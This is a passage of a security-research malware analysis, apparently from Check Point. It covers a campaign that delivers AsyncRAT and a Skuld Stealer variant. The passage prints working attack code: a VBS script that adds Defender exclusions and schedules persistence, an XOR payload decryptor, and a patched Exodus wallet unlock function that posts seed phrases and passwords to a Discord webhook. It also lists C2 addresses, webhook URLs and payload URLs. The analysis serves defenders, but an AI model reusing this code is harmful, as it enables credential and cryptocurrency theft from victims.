-&lt;li&gt;&lt;strong&gt;nat1.vbs&lt;/strong&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;p&gt;This script attempts to evade Windows Defender detection by adding the user&amp;#8217;s directory to Defender&amp;#8217;s exclusion paths.&amp;nbsp;It also schedules a persistent task named&amp;nbsp;&lt;code&gt;checker&lt;/code&gt;,&amp;nbsp;set to run every 5 minutes with the highest privileges.&amp;nbsp;This task periodically launches the second script,&amp;nbsp;&lt;strong&gt;runsys.vbs&lt;/strong&gt;.&amp;nbsp;In addition,&amp;nbsp;the script ensures the creation of a placeholder file&amp;nbsp;called &lt;strong&gt;settings.txt&lt;/strong&gt;.&amp;nbsp;This file acts as an execution flag:&amp;nbsp;The malware checks for its existence upon startup to determine if it has previously run.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;Dim objNetwork, strUsername, objShellApp, objShell, strExclusionPath, strTaskCommand
-Set objNetwork = CreateObject("WScript.Network")
-strUsername = objNetwork.UserName
-Set objShellApp = CreateObject("Shell.Application")
-Set objShell = CreateObject("WScript.Shell")
-strExclusionPath = "C:\\users\\" &amp;amp; strUsername
-objShellApp.ShellExecute "PowerShell", "-Command Add-MpPreference -ExclusionPath '" &amp;amp; strExclusionPath &amp;amp; "'", "", "runas", 0
-strTaskCommand = "schtasks /create /tn ""checker"" /tr ""wscript.exe \\""C:\\Users\\" &amp;amp; strUsername &amp;amp; "\\AppData\\Local\\ServiceHelper\\runsys.vbs\\"""" /sc MINUTE /mo 5 /RL HIGHEST"
-objShell.Run "cmd /c " &amp;amp; strTaskCommand, 0, True
-strFilePath = "C:\\users\\" &amp;amp; strUsername &amp;amp; "\\AppData\\Local\\ServiceHelper\\settings.txt"
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-If Not objFSO.FileExists(strFilePath) Then
-    Call objFSO.CreateTextFile(strFilePath, True)
-End If
-Set objShellApp = Nothing
-Set objShell = Nothing
-Set objNetwork = Nothing
-Set objFSO = Nothing
-&lt;/pre&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;runsys.vbs&lt;/strong&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;p&gt;This short script silently executes the second-stage payload executable&amp;nbsp;&lt;strong&gt;syshelpers.exe&lt;/strong&gt;.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;On Error Resume Next
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run """C:\\Users\\%UserName%\\AppData\\Local\\ServiceHelper\\syshelpers.exe""", 0, False
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;Once these scripts are set up,&amp;nbsp;the dropper proceeds to download two encrypted payloads from Bitbucket:&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;URL&lt;/th&gt;&lt;th&gt;Local file name&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/skul.exe&lt;/td&gt;&lt;td&gt;searchHost.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/Rnr.exe&lt;/td&gt;&lt;td&gt;syshelpers.exe&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;To perform HTTP requests, the malware uses the following specific User-agent string:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;code&gt;Dynamic WinHTTP Client/1.0&lt;/code&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;Both files are stored encrypted on the Bitbucket service.&amp;nbsp;To decrypt these downloaded executables,&amp;nbsp;the malware applies the following XOR-based algorithm:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;def decrypt_data(data):
-    return bytes(b ^ ((119 + 5 * i) &amp;amp; 0xFF) for i, b in enumerate(data))
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;Despite using a relatively simple encryption scheme,&amp;nbsp;this technique effectively prevents detection of the malicious payloads stored on Bitbucket.&amp;nbsp;At the time of this writing,&amp;nbsp;neither of the two downloaded files&amp;nbsp;(&lt;strong&gt;skul.exe&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;Rnr.exe&lt;/strong&gt;)&amp;nbsp;is flagged as malicious by any antivirus vendor on VirusTotal.&amp;nbsp;Previously,&amp;nbsp;we observed similar use of payload encryption by malware such as GuLoader,&amp;nbsp;enabling threat actors to leverage legitimate services like Google Drive for payload hosting and&amp;nbsp;effectively evade antivirus detection.&lt;/p&gt;
-
-
-
-&lt;p&gt;Upon successful decryption,&amp;nbsp;these files are stored in the previously created directory&amp;nbsp;(&lt;strong&gt;ServiceHelper&lt;/strong&gt;).&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;The first downloaded file&amp;nbsp;&lt;strong&gt;searchHost.exe&lt;/strong&gt;&amp;nbsp;(initially&amp;nbsp;&lt;strong&gt;skul.exe&lt;/strong&gt;) is executed immediately by calling the&amp;nbsp;&lt;code&gt;CreateProcessW&lt;/code&gt;&amp;nbsp;API function.&lt;/li&gt;
-
-
-
-&lt;li&gt;The second file&amp;nbsp;&lt;strong&gt;syshelpers.exe&lt;/strong&gt;&amp;nbsp;(initially&amp;nbsp;&lt;strong&gt;Rnr.exe&lt;/strong&gt;) is executed every five minutes by the previously scheduled task (&lt;strong&gt;runsys.vbs&lt;/strong&gt;), thus ensuring long-term persistence on the victim’s machine.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Second Stage Downloader: Rnr.exe&lt;/h2&gt;
-
-
-
-&lt;p&gt;The file&amp;nbsp;&lt;strong&gt;Rnr.exe&lt;/strong&gt;&amp;nbsp;(decrypted SHA256:&amp;nbsp;&lt;strong&gt;5d0509f68a9b7c415a726be75a078180e3f02e59866f193b0a99eee8e39c874f&lt;/strong&gt;),&amp;nbsp;downloaded from Bitbucket and saved locally as&amp;nbsp;&lt;strong&gt;syshelpers.exe&lt;/strong&gt;,&amp;nbsp;also acts as a downloader.&lt;/p&gt;
-
-
-
-&lt;p&gt;It shares many similarities with the previously described downloader&amp;nbsp;(&lt;strong&gt;installer.exe&lt;/strong&gt;), in particular that&amp;nbsp;both use XOR obfuscation with a single-byte key to hide strings and API function names.&lt;/p&gt;
-
-
-
-&lt;p&gt;When sending HTTP requests to download its payload,&amp;nbsp;the sample sets the following&amp;nbsp;&lt;code&gt;User-Agent&lt;/code&gt;&amp;nbsp;header:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;code&gt;Dynamic WinHTTP Client/1.0&lt;/code&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;The encrypted payload is downloaded from this URL:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;https://bitbucket[.]org/updatevak/upd/downloads/AClient.exe&lt;/strong&gt;&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31492" height="793" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-16-Encrypted-paths-and-a-URL-in-the-second-stage-downloader.png" width="814" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 16&lt;/strong&gt; &amp;#8211; Encrypted paths and a URL in the second stage downloader.&lt;/p&gt;
-
-
-
-&lt;p&gt;The same file can also be found on the previously discussed repository:&amp;nbsp;&lt;code&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/AClient.exe&lt;/code&gt;.&amp;nbsp;This may indicate that there could be other versions of the&amp;nbsp;&lt;strong&gt;Rnr.exe&lt;/strong&gt;&amp;nbsp;file downloading payloads from different repositories.&lt;/p&gt;
-
-
-
-&lt;p&gt;This downloader employs an interesting sandbox evasion technique.&amp;nbsp;On first execution,&amp;nbsp;the downloader fetches the payload from the above URL and saves it in the current directory under the name&amp;nbsp;”&lt;strong&gt;updatelog&lt;/strong&gt;”&amp;nbsp;(Note:&amp;nbsp;There is no file extension).&amp;nbsp;It then immediately exits without decrypting or executing the payload.&lt;/p&gt;
-
-
-
-&lt;p&gt;However,&amp;nbsp;as described earlier,&amp;nbsp;this executable is automatically re-executed every five minutes via a scheduled task&amp;nbsp;(&lt;strong&gt;runsys.vbs&lt;/strong&gt;).&amp;nbsp;On the next launch,&amp;nbsp;the downloader checks for the presence of the&amp;nbsp;”&lt;strong&gt;updatelog&lt;/strong&gt;”&amp;nbsp;file.&amp;nbsp;If the file exists,&amp;nbsp;the downloader proceeds to decrypt it using the same XOR-based algorithm used by the previous downloader and saves the result as&amp;nbsp;&lt;strong&gt;syshelp.exe&lt;/strong&gt;&amp;nbsp;in the same directory.&lt;/p&gt;
-
-
-
-&lt;p&gt;On every subsequent run,&amp;nbsp;the downloader checks if the file&amp;nbsp;&lt;strong&gt;syshelp.exe&lt;/strong&gt;&amp;nbsp;exists in the current folder,&amp;nbsp;and if so,&amp;nbsp;the downloader executes it.&lt;/p&gt;
-
-
-
-&lt;p&gt;Even when the full infection chain is triggered starting from the initial PowerShell script,&amp;nbsp;the malware’s use of scheduled tasks causes significant delays:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Five minutes before the first download,&lt;/li&gt;
-
-
-
-&lt;li&gt;Another 5 minutes before decryption,&lt;/li&gt;
-
-
-
-&lt;li&gt;A final 5-minute delay before execution.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;In total,&amp;nbsp;at least 15 minutes must pass before any malicious behavior becomes visible&amp;nbsp;—&amp;nbsp;long enough to evade detection by many automated sandbox systems.&lt;/p&gt;
-
-
-
-&lt;p&gt;If this downloader is executed without prior context inside a sandbox, the final payload will be downloaded but never decrypted or run.&amp;nbsp;As a result,&amp;nbsp;none of its malicious behavior will be visible,&amp;nbsp;regardless of what the payload contains.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Payload 1: AClient.exe (AsyncRAT)&lt;/h2&gt;
-
-
-
-&lt;p&gt;The first payload delivered in this campaign,&amp;nbsp;&lt;strong&gt;AClient.exe&lt;/strong&gt;&amp;nbsp;(decrypted SHA256:&amp;nbsp;&lt;strong&gt;53b65b7c38e3d3fca465c547a8c1acc53c8723877c6884f8c3495ff8ccc94fbe&lt;/strong&gt;),&amp;nbsp;is a variant of the AsyncRAT malware,&amp;nbsp;version 0.5.8.&amp;nbsp;AsyncRAT an open-source Remote Access Trojan&amp;nbsp;(RAT).&amp;nbsp;It provides attackers with comprehensive remote control capabilities over infected systems,&amp;nbsp;including:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Executing arbitrary commands and scripts.&lt;/li&gt;
-
-
-
-&lt;li&gt;Keylogging and screen capturing.&lt;/li&gt;
-
-
-
-&lt;li&gt;File management (uploading, downloading, deleting files).&lt;/li&gt;
-
-
-
-&lt;li&gt;Remote desktop and camera access.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;This AsyncRAT sample uses a&amp;nbsp;&amp;#8220;dead drop resolver&amp;#8221;&amp;nbsp;technique:&amp;nbsp;Instead of directly embedding the command-and-control&amp;nbsp;(C&amp;amp;C)&amp;nbsp;server address,&amp;nbsp;the malware retrieves it from a publicly accessible third-party resource&amp;nbsp;&amp;#8211;&amp;nbsp;in this case,&amp;nbsp;a Pastebin document:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;https://pastebin.com/raw/ftknPNF7&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;At the time of analysis,&amp;nbsp;the Pastebin URL contained the following C&amp;amp;C server address:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;101.99.76.120:7707&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;However,&amp;nbsp;we later discovered that most of the time the address value was set to&amp;nbsp;&lt;code&gt;0.0.0.0:7707&lt;/code&gt;.&lt;/p&gt;
-
-
-
-&lt;p&gt;We also found earlier AsyncRAT samples related to the same threat actors with the following SHA256:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;d54fa589708546eca500fbeea44363443b86f2617c15c8f7603ff4fb05d494c1&lt;/strong&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;670be5b8c7fcd6e2920a4929fcaa380b1b0750bfa27336991a483c0c0221236a&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;The earliest sample was first seen on November 11, 2024.&amp;nbsp;These samples contain embedded C&amp;amp;C server addresses in their configuration:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;87.120.127.37:7707
-185.234.247.8:7707
-microads[.]top:7707
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;The registration date for the domain&amp;nbsp;&lt;code&gt;microads[.]top&lt;/code&gt;&amp;nbsp;is August 15, 2024, meaning that the threat actors are active at least from this date.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Payload 2: skul.exe (Skuld Stealer)&lt;/h2&gt;
-
-
-
-&lt;p&gt;The second payload downloaded from Bitbucket is&amp;nbsp;&lt;strong&gt;skul.exe&lt;/strong&gt;&amp;nbsp;(decrypted SHA256:&amp;nbsp;&lt;strong&gt;8135f126764592be3df17200f49140bfb546ec1b2c34a153aa509465406cb46c&lt;/strong&gt;).&amp;nbsp;This executable is identified as a variant of the&amp;nbsp;&lt;strong&gt;Skuld Stealer&lt;/strong&gt;,&amp;nbsp;a malware tool written in Go and publicly available as open source on GitHub.&lt;/p&gt;
-
-
-
-&lt;p&gt;The original Skuld Stealer project is described as a proof-of-concept malware targeting Windows systems,&amp;nbsp;designed to steal sensitive user data from multiple sources,&amp;nbsp;including Discord,&amp;nbsp;various browsers,&amp;nbsp;crypto wallets,&amp;nbsp;and gaming platforms.&lt;/p&gt;
-
-
-
-&lt;p&gt;The original Skuld Stealer provides extensive functionality,&amp;nbsp;including:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Anti-debugging (termination of debugging tools).&lt;/li&gt;
-
-
-
-&lt;li&gt;Virtual machine detection and sandbox evasion.&lt;/li&gt;
-
-
-
-&lt;li&gt;Credential theft from Chromium-based and Gecko-based browsers (logins, cookies, credit cards, browser history).&lt;/li&gt;
-
-
-
-&lt;li&gt;Crypto clipper (replaces clipboard contents with attacker-controlled cryptocurrency addresses).&lt;/li&gt;
-
-
-
-&lt;li&gt;Stealing Discord authentication tokens.&lt;/li&gt;
-
-
-
-&lt;li&gt;Discord injection module to intercept sensitive user operations such as login, password changes, payment information additions, preventing requests to view devices, and blocking QR logins.&lt;/li&gt;
-
-
-
-&lt;li&gt;Collecting sessions from popular gaming platforms (Epic Games, Minecraft, Riot Games, Uplay).&lt;/li&gt;
-
-
-
-&lt;li&gt;System information gathering (CPU, GPU, RAM, IP, geolocation, Wi-Fi networks).&lt;/li&gt;
-
-
-
-&lt;li&gt;Crypto wallet data theft, including mnemonic phrases and passwords.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;However,&amp;nbsp;the variant used in this specific campaign differs from the publicly available version in several aspects.&amp;nbsp;Notably,&amp;nbsp;it omits certain functionality:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;No crypto clipper.&lt;/li&gt;
-
-
-
-&lt;li&gt;No anti-debugging measures.&lt;/li&gt;
-
-
-
-&lt;li&gt;No stealing sessions from gaming platforms.&lt;/li&gt;
-
-
-
-&lt;li&gt;No built-in persistence mechanism: Unlike the public version, this stealer does not implement internal persistence. Instead, persistence is externally achieved through the previously described scheduled task (&lt;strong&gt;runsys.vbs&lt;/strong&gt;).&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;Let’s go deeper into some of the details of the variant used in this campaign.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading"&gt;Mutex Usage&lt;/h3&gt;
-
-
-
-&lt;p&gt;To prevent multiple instances of itself from running,&amp;nbsp;Skuld creates a mutex with a specific,&amp;nbsp;GUID-like name.&amp;nbsp;The variant used in this campaign uses the exact same mutex name as the open-source version:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;code&gt;3575651c-bb47-448e-a514-22865732bbc&lt;/code&gt;&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;func IsAlreadyRunning() bool {
-	const AppID = "3575651c-bb47-448e-a514-22865732bbc"
-
-	_, err := windows.CreateMutex(nil, false, syscall.StringToUTF16Ptr(fmt.Sprintf("Global\\\\%s", AppID)))
-	return err != nil
-}
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;This mutex name can be used as an IOC to detect if Skuld is active in the system.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading"&gt;Data Exfiltration via Discord Webhooks&lt;/h3&gt;
-
-
-
-&lt;p&gt;Skuld sends the collected data through a&amp;nbsp;&lt;strong&gt;Discord webhook&lt;/strong&gt;,&amp;nbsp;a one-way HTTP-based channel commonly used by applications to post automated messages and data to Discord channels.&amp;nbsp;Webhooks provide a convenient,&amp;nbsp;secure,&amp;nbsp;and easily configurable way for attackers to exfiltrate stolen information without maintaining complex command-and-control servers.&lt;/p&gt;
-
-
-
-&lt;p&gt;In the original open-source version of Skuld,&amp;nbsp;the Discord webhook URL is stored in plaintext within the configuration:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;CONFIG := map[string]interface{}{
-	"webhook": "https://discord.com/api/webhooks/...",
-	"cryptos": map[string]string{
-		"BTC":  "",  # crypto-clipper setup
-		"BCH":  "",
-		// ...
-	},
-}
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;However,&amp;nbsp;the variant analyzed in this campaign uses two separate Discord webhooks,&amp;nbsp;each serving different purposes,&amp;nbsp;and both URLs are encrypted using a single-byte XOR cipher.&lt;/p&gt;
-
-
-
-&lt;p&gt;Upon execution,&amp;nbsp;the malware decrypts both webhook URLs:&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31493" height="360" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-17-Webhook-URL-decryption-in-Skuld-stealer.png" width="660" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 17&lt;/strong&gt; &amp;#8211; Webhook URL decryption in Skuld stealer.&lt;/p&gt;
-
-
-
-&lt;p&gt;These are the decrypted webhook URLs:&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;URL&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;webhook&lt;/td&gt;&lt;td&gt;https://discord[.]com/api/webhooks/1355186248578502736/_RDywh_K6GQKXiM5T05ueXSSjYopg9nY6XFJo1o5Jnz6v9sih59A8p-6HkndI_nOTicO&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;webhook2&lt;/td&gt;&lt;td&gt;https://discord[.]com/api/webhooks/1348629600560742462/RJgSAE7cYY-1eKMkl5EI-qZMuHaujnRBMVU_8zcIaMKyQi4mCVjc9R0zhDQ7wmPoD7Xp&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;The first webhook (&lt;code&gt;webhookencr&lt;/code&gt;) is used for exfiltrating general data, such as browser credentials, system information, and Discord tokens.&lt;/li&gt;
-
-
-
-&lt;li&gt;The second webhook (&lt;code&gt;webhookencr2&lt;/code&gt;) is specifically reserved for exfiltrating highly sensitive data: crypto wallet seed phrases and passwords from the&amp;nbsp;&lt;strong&gt;Exodus&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;Atomic&lt;/strong&gt;&amp;nbsp;crypto wallets.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;Below is a partially restored Go-code responsible for this logic:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;func main() {
-	CONFIG["webhook"] = decryptXOR(CONFIG["webhookencr"].(string))
-	CONFIG["webhook2"] = decryptXOR(CONFIG["webhookencr2"].(string))
-
-	actions := []func(string){
-		wallets.Run,
-		browsers.Run,
-		system.Run,
-		discodes.Run,
-		commonfiles.Run,
-		tokens.Run,
-	}
-
-	// Standard modules using the first webhook
-	for _, action := range actions {
-		go action(CONFIG["webhook"].(string))
-	}
-
-	// Special module for crypto wallet injection using the second webhook
-	go mainGowrap1(CONFIG["webhook2"].(string))
-}
-
-func mainGowrap1(webhook2 string) {
-	atomicURL := "https://github.com/hackirby/wallets-injection/raw/main/atomic.asar"
-	exodusURL := "https://github.com/hackirby/wallets-injection/raw/main/exodus.asar"
-	walletsinjection.Run(atomicURL, exodusURL, webhook2)
-}
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;Skuld uses a malicious technique known as wallet injection.&amp;nbsp;It replaces legitimate cryptocurrency wallet application files&amp;nbsp;(&lt;strong&gt;app.asar&lt;/strong&gt;)&amp;nbsp;with modified versions downloaded from GitHub.&amp;nbsp;Skuld Stealer specifically targets the Exodus and Atomic crypto wallets.&amp;nbsp;The &lt;strong&gt;.asar&lt;/strong&gt;&amp;nbsp;files are archive files used by Electron applications&amp;nbsp;(cross-platform applications built with JavaScript,&amp;nbsp;HTML,&amp;nbsp;and CSS).&amp;nbsp;Electron applications commonly use&amp;nbsp;&lt;strong&gt;.asar&lt;/strong&gt;&amp;nbsp;archives to package their source code and assets.&lt;/p&gt;
-
-
-
-&lt;p&gt;Skuld Stealer downloads malicious&amp;nbsp;&lt;code&gt;.asar&lt;/code&gt;&amp;nbsp;files from the following repositories:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;Atomic Wallet&lt;/strong&gt;: &lt;code&gt;https://github.com/hackirby/wallets-injection/raw/main/atomic.asar&lt;/code&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;Exodus Wallet&lt;/strong&gt;: &lt;code&gt;https://github.com/hackirby/wallets-injection/raw/main/exodus.asar&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;Once downloaded,&amp;nbsp;Skuld replaces the original wallet archives with these malicious versions.&amp;nbsp;Additionally,&amp;nbsp;Skuld creates seemingly harmless LICENSE text files in the wallet directories,&amp;nbsp;and embeds Discord webhook URLs:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;Atomic wallet:&lt;/strong&gt; &lt;code&gt;%LOCALAPPDATA%\\Programs\\atomic\\LICENSE.electron.txt&lt;/code&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;Exodus wallet:&lt;/strong&gt; &lt;code&gt;%LOCALAPPDATA%\\exodus\\app-&amp;lt;version&amp;gt;\\LICENSE&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31494" height="366" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-18-Fake-LICENSE-file-in-Exodus-wallet-contains-a-Discord-webhook-URL.png" width="577" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 18&lt;/strong&gt; &amp;#8211; Fake LICENSE file in Exodus wallet contains a Discord webhook URL.&lt;/p&gt;
-
-
-
-&lt;p&gt;These webhook URLs are then read by the malicious JavaScript inside the injected&amp;nbsp;&lt;code&gt;.asar&lt;/code&gt;&amp;nbsp;files.&lt;/p&gt;
-
-
-
-&lt;p&gt;When users interact with their wallets,&amp;nbsp;the patched JavaScript function extracts sensitive user data, such as password and seed phrases,&amp;nbsp;and sends it to the attacker.&lt;/p&gt;
-
-
-
-&lt;p&gt;For instance,&amp;nbsp;in the case of the&amp;nbsp;&lt;strong&gt;Exodus wallet&lt;/strong&gt;,&amp;nbsp;Skuld injects malicious code into the wallet&amp;#8217;s&amp;nbsp;&lt;code&gt;unlock&lt;/code&gt;&amp;nbsp;function,&amp;nbsp;which receives the user&amp;#8217;s entered password and retrieves the seed phrase.&amp;nbsp;The malicious JavaScript then sends both the extracted seed phrase and password to the attacker via the Discord webhook.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;      async unlock(e) {
-         if (await this.shouldUseTwoFactorAuthMode()) return;
-         const t = await Object(ee.readSeco)(this._walletPaths.seedFile, e);
-         this._setSeed(M.fromBuffer(t)), P.a.randomFillSync(t), await this._loadLightningCreds()
-
-         const webhook = await fs.readFile('LICENSE', 'utf8');
-         const mnemonic = this._seed.mnemonicString;
-         const password = e;
-         const computerName = os.hostname();
-         const username = os.userInfo().username;
-
-         var request = new XMLHttpRequest();
-         request.open("POST", webhook, true);
-         request.setRequestHeader("Content-Type", "application/json");
-
-         var payload = JSON.stringify({
-            "username": "skuld - exodus injection",
-            "avatar_url": "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png",
-            "content": "`" + computerName + "`" + " - " + "`" + username + "`",
-            "embeds": [
-            {
-               "title": "Exodus Injection",
-               "color": 0xb143e3,
-               "footer": {
-                  "text": "skuld exodus injection - made by hackirby",
-                  "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
-               },
-               "fields": [
-                  {
-                     "name": "Mnemonic",
-                     "value": "`" + mnemonic + "`",
-                  },
-                  {
-                     "name": "Password",
-                     "value": "`" + password + "`",
-                  },
-               ],
-            },
-         ]});
-
-         request.send(payload);
-
-      }
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;As we know,&amp;nbsp;the seed phrase&amp;nbsp;(or mnemonic phrase)&amp;nbsp;is a human‑readable representation of a wallet’s master private key.&amp;nbsp;Under standards like&amp;nbsp;&lt;a href="https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki"&gt;BIP‑39&lt;/a&gt;,&amp;nbsp;a 12‑&amp;nbsp;or 24‑word mnemonic encodes the entropy that,&amp;nbsp;when run through a key‑derivation function&amp;nbsp;(e.g.&amp;nbsp;&lt;a href="https://datatracker.ietf.org/doc/html/rfc2898"&gt;PBKDF2&lt;/a&gt;)&amp;nbsp;and the&amp;nbsp;&lt;a href="https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki"&gt;BIP‑32&lt;/a&gt;&amp;nbsp;hierarchical‑deterministic algorithm,&amp;nbsp;generates the wallet’s master private key and all its descendant private/public key pairs.&lt;/p&gt;
-
-
-
-&lt;p&gt;In practical terms,&amp;nbsp;obtaining a user’s seed phrase lets an attacker reconstruct every private key in that wallet’s keychain and therefore grants full control over all cryptocurrency addresses and funds derived from it.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Campaign Evolution and Addition of New Modules&lt;/h2&gt;
-
-
-
-&lt;p&gt;During our ongoing monitoring of the campaign,&amp;nbsp;we observed that the threat actors periodically update the&amp;nbsp;&lt;code&gt;installer.exe&lt;/code&gt;&amp;nbsp;downloader.&amp;nbsp;Newer versions often achieve zero detection rates on VirusTotal.&amp;nbsp;Additionally,&amp;nbsp;new payloads are occasionally introduced.&lt;/p&gt;
-
-
-
-&lt;p&gt;In 2024,&amp;nbsp;Google introduced a security feature in Chrome called Application-Bound Encryption&amp;nbsp;(ABE),&amp;nbsp;aimed at preventing cookie extraction via standard access to SQLite&amp;nbsp;Cookies&amp;nbsp;files.&amp;nbsp;This enhancement rendered most traditional stealers,&amp;nbsp;including Skuld,&amp;nbsp;ineffective.&lt;/p&gt;
-
-
-
-&lt;p&gt;To circumvent this,&amp;nbsp;attackers adapted the open-source tool ChromeKatz&amp;nbsp;(&lt;a href="https://github.com/Meckazin/ChromeKatz/"&gt;https://github.com/Meckazin/ChromeKatz/&lt;/a&gt;),&amp;nbsp;enabling them to steal cookies from updated versions of Google Chrome,&amp;nbsp;as well as Chromium-based browsers like Edge and Brave.&amp;nbsp;The updated&amp;nbsp;&lt;code&gt;installer.exe&lt;/code&gt;&amp;nbsp;(SHA256:&amp;nbsp;&lt;strong&gt;160eda7ad14610d93f28b7dee20501028c1a9d4f5dc0437794ccfc2604807693&lt;/strong&gt;)&amp;nbsp;also downloads the stealer from BitBucket,&amp;nbsp;where it is stored in encrypted form:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/cks.exe&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;To decrypt the downloaded binary,&amp;nbsp;the loader uses the same encryption algorithm used for the other payloads.&amp;nbsp;The decrypted&amp;nbsp;&lt;strong&gt;cks.exe&lt;/strong&gt;&amp;nbsp;has the SHA256 hash:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
